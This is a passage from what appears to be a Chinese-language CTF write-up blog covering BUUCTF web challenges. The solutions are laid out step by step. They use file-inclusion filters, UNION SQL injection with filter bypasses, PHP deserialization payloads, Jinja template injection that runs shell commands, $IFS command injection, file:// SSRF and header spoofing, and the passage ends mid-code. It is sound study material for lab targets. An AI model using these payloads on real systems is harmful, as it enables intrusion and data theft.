+</code></pre></div><h2 id="secret-file">Secret File</h2>
+<p>查看源码可以找到<code>./Archive_room.php&quot;</code>，访问之后是一个新的页面，有一个可以点击的 SECRET 按钮，点击之后会进行跳转 <code>action.php</code>，但是这个页面会直接再次跳转到 <code>end.php</code>，所以我们需要抓包看看有什么内容：
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/secret.png" alt="secret"></p>
+<p>那就访问这个页面，显示出了源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);    <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);    $file<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;file&#39;</span>];    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strstr</span>($file,<span style="color:#e6db74">&#34;../&#34;</span>)<span style="color:#f92672">||</span><span style="color:#a6e22e">stristr</span>($file, <span style="color:#e6db74">&#34;tp&#34;</span>)<span style="color:#f92672">||</span><span style="color:#a6e22e">stristr</span>($file,<span style="color:#e6db74">&#34;input&#34;</span>)<span style="color:#f92672">||</span><span style="color:#a6e22e">stristr</span>($file,<span style="color:#e6db74">&#34;data&#34;</span>)){        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Oh no!&#34;</span>;        <span style="color:#66d9ef">exit</span>();    }    <span style="color:#66d9ef">include</span>($file); <span style="color:#75715e">//flag放在了flag.php里?&gt;
+</span></code></pre></div><p>直接访问时无法显示flag，应该时被解析掉了，那么可以尝试使用伪协议对文件进行编码，显示变么后的内容：
+<code>secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code>
+然后就能返回一长串字符，对其进行 base64 解码就能找到flag。</p>
+<h2 id="fakebook">Fakebook</h2>
+<p>先注册：注册之后访问个人页面发现url存在注入点，虽然有过滤但是可以使用注释绕过：
+<code>view.php?no=0 /**/union/**/ select 1,2,3,4 # </code>
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/fakebook.png" alt="fakebook"></p>
+<p>注意到 username 返回的时第二个内容，age 和 blog 则是错误，而且上方后有一个反序列化的错误。那就先利用2来看一下表的信息：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#75715e">-- 常规操作view.php?no=0 /**/union/**/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = &#34;fakebook&#34; and table_name=&#34;users&#34;#no,username,passwd,data
+</span></code></pre></div><p>返回表中有四个字段，可以看出确实与前端显示的内容不一致，主要是 data 数据，看看是什么：</p>
+<pre tabindex="0"><code>view.php?no=0 /**/union/**/ select 111,group_concat(data),3,4 from users # O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:11:&quot;admin.admin&quot;;}
+</code></pre><p>注意到返回的对用户信息序列化形成的字符串，因此可以猜测应该是从数据库中获取数据口对其进行反序列化操作，并将结果放入相应的表项中，因此当我们只是输入数字的时候返回了错误。
+测试将 data 放入4的位置可以正常显示页面：</p>
+<pre tabindex="0"><code>view.php?no=0 /**/union/**/ select 111,group_concat(data),3,data from users # 
+</code></pre><p>但是仅仅这样还是没有办法得到flag，因为我们只是重复了本来要执行的操作，而且数据库中并没有其他信息。于是尝试有没有其他线索，访问<code>robots.txt</code>可以看到有一个备份文件，可以下载下来：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">phpclass</span> <span style="color:#a6e22e">UserInfo</span>{    <span style="color:#66d9ef">public</span> $name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;    <span style="color:#66d9ef">public</span> $age <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;    <span style="color:#66d9ef">public</span> $blog <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($name, $age, $blog)    {        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> $name;        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>)$age;        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span> <span style="color:#f92672">=</span> $blog;    }    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>($url)    {        $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_URL</span>, $url);        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);        $output <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);        $httpCode <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_getinfo</span>($ch, <span style="color:#a6e22e">CURLINFO_HTTP_CODE</span>);        <span style="color:#66d9ef">if</span>($httpCode <span style="color:#f92672">==</span> <span style="color:#ae81ff">404</span>) {            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">404</span>;        }        <span style="color:#a6e22e">curl_close</span>($ch);        <span style="color:#66d9ef">return</span> $output;    }    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getBlogContents</span> ()    {        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span>);    }    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isValidBlog</span> ()    {        $blog <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span>;        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span>, $blog);    }}
+</code></pre></div><p>是关于用户信息的类，注意到有一个 curl_exec() 函数，查阅手册得知这个函数可以创建一个 curl 会话，经过扫描之后还能发现存在一个 flag.php，因此可以考虑使用这个函数借助 PHP 伪协议获取 flag.php。</p>
+<pre tabindex="0"><code>view.php?no=0 /**/union/**/ select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' #
+</code></pre><p><img src="http://ctf-qn.hufl.top//BUUCTF/04/03/fakebook2.png" alt="fakebook2"></p>
+<p>将数据进行 base64 解码就可以看到 flag。</p>
+<h2 id="php">PHP</h2>
+<p>提示有备份，访问 <code>www.zip</code> 可以下载源码。
+三个php文件，比较有营养的是 class.php</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">phpinclude</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>;<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Name</span>{    <span style="color:#66d9ef">private</span> $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nonono&#39;</span>;    <span style="color:#66d9ef">private</span> $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;yesyes&#39;</span>;    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username,$password){        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;    }    <span style="color:#66d9ef">function</span> __wakeup(){        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;guest&#39;</span>;    }    <span style="color:#66d9ef">function</span> __destruct(){        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">100</span>) {            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&#34;</span>;            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;You name is: &#34;</span>;            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span>;<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/br&gt;&#34;</span>;            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;You password is: &#34;</span>;            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span>;<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/br&gt;&#34;</span>;            <span style="color:#66d9ef">die</span>();        }        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;admin&#39;</span>) {            <span style="color:#66d9ef">global</span> $flag;            <span style="color:#66d9ef">echo</span> $flag;        }<span style="color:#66d9ef">else</span>{            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&#34;</span>;            <span style="color:#66d9ef">die</span>();                    }    }}<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>然后 index.php 包含该文件，并接收一个参数，并将参数反序列化。而 class 中包含了 flag.php，并在满足条件的情况下输出 flag。所以思路就是传入一个字符串，反序列化为 Name 类，然后输出flag。
+然后再来看看这个类，首先是一个 <strong>__wakeup()</strong> 魔术方法，反序列化后调用它，但是它会将 username 设置为 guest，那就无法输出flag了，因此需要绕过这个方法，那还是很简单的，将对象变量数量大于实际即可，接下来构造 password=100 &amp;&amp; username=admin 即可：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">phpclass</span> <span style="color:#a6e22e">Name</span>{    <span style="color:#66d9ef">private</span> $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nonono&#39;</span>;    <span style="color:#66d9ef">private</span> $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;yesyes&#39;</span>;    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username,$password){        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;    }}$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Name</span>(<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#ae81ff">100</span>);<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
+</code></pre></div><p><img src="http://ctf-qn.hufl.top//BUUCTF/04/03/php.png" alt="php"></p>
+<h2 id="fake-google">fake google</h2>
+<p>模板注入，payload：
+<code>{ {config.__class__.__init__.__globals__[%27os%27].popen(%27cmd%27).read()}}</code></p>
+<blockquote>
+<p>qaq?name={ {config.<strong>class</strong>.<strong>init</strong>.<strong>globals</strong>[%27os%27].popen(%27ls%20/%27).read()}}
+P3&rsquo;s girlfirend is : app bd_build bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+qaq?name={ {config.<strong>class</strong>.<strong>init</strong>.<strong>globals</strong>[%27os%27].popen(&lsquo;cat /flag&rsquo;).read()}}
+P3&rsquo;s girlfirend is : flag{0f4e50bb-0f3c-4326-a3e5-dcac15eda03f}</p>
+</blockquote>
+<h2 id="knife">Knife</h2>
+<p>白给的shell，直接连接就能找到flag就行了。</p>
+<h2 id="lovesql">LoveSQL</h2>
+<p>看名字就又是一道SQL注入，没什么过滤，直接找flag就行了
+<code>check.php?username=admin&amp;password=' union select 1,2,3%23</code>
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/lovesql.png" alt="lovesql"></p>
+<p>后两个可以显示，那就常规做法：</p>
+<blockquote>
+<p>username=admin&amp;password=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23
+ello geekuser,l0ve1ysq1！
+username=admin&amp;password=' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&lsquo;l0ve1ysq1&rsquo; %23
+Hello id,username,password！
+our password is &lsquo;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{0e628b19-ef19-4f37-923b-dd21cf90d275}&rsquo;</p>
+</blockquote>
+<p>可以找到flag。</p>
+<h2 id="ssrf-me未完成">SSRF Me（未完成）</h2>
+<p>Python Flask 代码审计，还不太会，先放这里。</p>
+<h2 id="http">HTTP</h2>
+<p>考察几个基本的 HTTP 伪装。
+查看源码可以发现一个 Secret.php，访问之后显示<code>It doesn't come from 'https://www.Sycsecret.com'</code>，所以应该是 Referer;
+伪造之后再次访问要求使用 <code>&quot;Syclover&quot; browser</code>，更改User-Agent就行；
+最后提示要本地访问：<code>No!!! you can only read this locally!!!</code>，那先伪造个 XFF 试试：
+<img src="http://ctf-qn.hufl.top//BUUCTF/04/03/http.png" alt="http">
+这次就能获得flag了。</p>
+<h2 id="easy-java未完成">Easy Java（未完成）</h2>
+<p>Java 也先放这里吧</p>
+<h2 id="ping-ping-ping">Ping Ping Ping</h2>
+<p>典型的命令执行，先使用<code>?ip=1;ls</code>，可以直接显示出有flag.php，继续直接<code>cat flag.php</code>，这时候发现有过滤：<strong>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</strong>，继续测试还过滤了一些字符以及 flag.
+那就是绕过了，首先是测试发现 <em>$</em> 是没有被过滤的，那么可以使用 <code>\$IFS</code> 绕过，之后是文件名 flag ；这个可以使用变量拼接来绕过。
+最终构造payload：<code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
+<h2 id="nizhuangsiwei">NiZhuangSiWei</h2>
+<p>上来是给出了源码，接受三个参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>  $text <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;text&#34;</span>];$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>];$password <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;password&#34;</span>];<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($text)<span style="color:#f92672">&amp;&amp;</span>(<span style="color:#a6e22e">file_get_contents</span>($text,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;welcome to the zjctf&#34;</span>)){    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">file_get_contents</span>($text,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span>;    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/&#34;</span>,$file)){        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Not now!&#34;</span>;        <span style="color:#66d9ef">exit</span>();     }<span style="color:#66d9ef">else</span>{        <span style="color:#66d9ef">include</span>($file);  <span style="color:#75715e">//useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt;
+</span></code></pre></div><p>第一个text可以使用data伪协议绕过；第二个就是文件包含，使用 php 伪协议查看内容将内容编码；第三个反序列化暂时还没办法用。
+<code>/?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Flag</span>{  <span style="color:#75715e">//flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &#34;&lt;br&gt;&#34;;        return (&#34;U R SO CLOSE !///COME ON PLZ&#34;);        }      }  }  ?&gt;  
+</span></code></pre></div><p>这里有这个类，<strong>__toString()</strong> 方法可以包含文件，之前的源码刚好反序列化后有一个 echo 将其作为字符串输出，那么直接序列化就行。
+<code>password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>
+查看源码就能看到flag。</p>
+<h2 id="babysql">BabySQL</h2>
+<p>还是SQL，提示做了过滤，测试注入点还是存在，但是使用<code>order by</code>时返回了错误：<code>use near 'der 3 #'' at line 1</code>，可以看出前面的 <em>or</em> 和 <em>by</em>消失了，猜测是应该匹配之后直接替换为空，尝试一下嵌套：
+<code>?username=admin&amp;password=admin'  oorrder bbyy 3 %23</code>这次能显示了，之后就和之前一样，只是将黑名单中的单词嵌套一下就行了。</p>
+<h2 id="old-hack">old-hack</h2>
+<p>上来就是一个黑页：
+<img src="http://ctf-qn.hufl.top//BJD2/hack1.png" alt="hack1">
+值得注意的就是使用了ThinkPHP5，那么就查一下thinkphp5有没有什么可以利用的漏洞：
+<img src="http://ctf-qn.hufl.top//BJD2/hack2.png" alt="hack2">
+可以看出thinkphp5是由两个RCE漏洞的。尝试直接使用第一个payload之后会出现一个报错页面，可以发现thinkphp版本为5.0.23，那么就不能使用第一个了，所以使用下面的payload：
+<img src="http://ctf-qn.hufl.top//BJD2/hack3.png" alt="hack3">
+这次直接套用payload就可以执行命令了，然后找到flag就行了。</p>
+<h2 id="buyflag">BuyFlag</h2>
+<p>可以找到一个 <strong>pay.php</strong> 页面，访问之后提示要有足够的前，还有一个身份验证，然后就没有其他东西了。查款源码，发现了 post 参数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#f92672">~~~</span><span style="color:#a6e22e">post</span> <span style="color:#a6e22e">money</span> <span style="color:#66d9ef">and</span> <span style="color:#a6e22e">password</span><span style="color:#f92672">~~~</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>])) {	$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>];	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_numeric</span>($password)) {		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;password can&#39;t be number&lt;/br&gt;&#34;</span>;	}<span style="color:#66d9ef">elseif</span> ($password <span style="color:#f92672">==</span> <span style="color:#ae81ff">404</span>) {		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Password Right!&lt;/br&gt;&#34;</span>;	}}
+</code></pre></div><p>直接传递参数无果，应该是还有其他验证；提示只能是 CUIT 的学生，所以查看header有没有什么验证身份的，发现cookie 有一个 user=0，将其改为 1 之后发现可以传参。
+<code>password=404a&amp;money=100000000</code></p>
+<blockquote>
+<p>you are Cuiter
+Password Right!
+Nember lenth is too long</p>
+</blockquote>
+<p>返回第三条，应该是想说 money 值太长，那么使用科学计数法试试：
+<code>password=404a&amp;money=1e9</code></p>
+<blockquote>
+<p>you are Cuiter
+Password Right!
+flag{ed5b6041-88b0-43e6-9957-fc365c807af5}</p>
+</blockquote>
+<h2 id="piapiapia">piapiapia</h2>
+<p>直接在输入框测试，没有发现注入，查看其他网页，发现有一个 www.zip ，下载得到源码。
+先看看index.php:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>	<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>);	<span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>]) {		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: profile.php&#39;</span>);		<span style="color:#66d9ef">exit</span>;	}	<span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) {		$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];		$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>];		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($username) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strlen</span>($username) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span>) 			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid user name&#39;</span>);		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($password) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strlen</span>($password) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span>) 			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid password&#39;</span>);		<span style="color:#66d9ef">if</span>($user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">login</span>($username, $password)) {			$_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> $username;			<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: profile.php&#39;</span>);			<span style="color:#66d9ef">exit</span>;			}		<span style="color:#66d9ef">else</span> {			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid user name or password&#39;</span>);		}	}	<span style="color:#66d9ef">else</span> {<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>没什么内容，基本上就是登录之后会跳转到 <em>profile.php</em> ,看看这个文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>	<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>);	<span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Login First&#39;</span>);		}	$username <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>];	$profile<span style="color:#f92672">=</span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show_profile</span>($username);	<span style="color:#66d9ef">if</span>($profile  <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: update.php&#39;</span>);	}	<span style="color:#66d9ef">else</span> {		$profile <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($profile);		$phone <span style="color:#f92672">=</span> $profile[<span style="color:#e6db74">&#39;phone&#39;</span>];		$email <span style="color:#f92672">=</span> $profile[<span style="color:#e6db74">&#39;email&#39;</span>];		$nickname <span style="color:#f92672">=</span> $profile[<span style="color:#e6db74">&#39;nickname&#39;</span>];		$photo <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($profile[<span style="color:#e6db74">&#39;photo&#39;</span>]));<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>有一个反序列化和一个file_get_contents()，有可能是利用反序列化为 photo 赋值为 <em>flag.php</em> 然后获取文件内容。那么就看看class.php和update.php:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">phprequire</span>(<span style="color:#e6db74">&#39;config.php&#39;</span>);<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">user</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">mysql</span>{	<span style="color:#66d9ef">private</span> $table <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users&#39;</span>;	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_exists</span>($username) {		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">select</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $where);	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">register</span>($username, $password) {		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);		$password <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($password);		$key_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">Array</span>(<span style="color:#e6db74">&#39;username&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>);		$value_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">Array</span>($username, <span style="color:#a6e22e">md5</span>($password));		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">insert</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $key_list, $value_list);	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">login</span>($username, $password) {		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);		$password <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($password);		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;		$object <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">select</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $where);		<span style="color:#66d9ef">if</span> ($object <span style="color:#f92672">&amp;&amp;</span> $object<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($password)) {			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;		} <span style="color:#66d9ef">else</span> {			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;		}	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show_profile</span>($username) {		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;		$object <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">select</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $where);		<span style="color:#66d9ef">return</span> $object<span style="color:#f92672">-&gt;</span><span 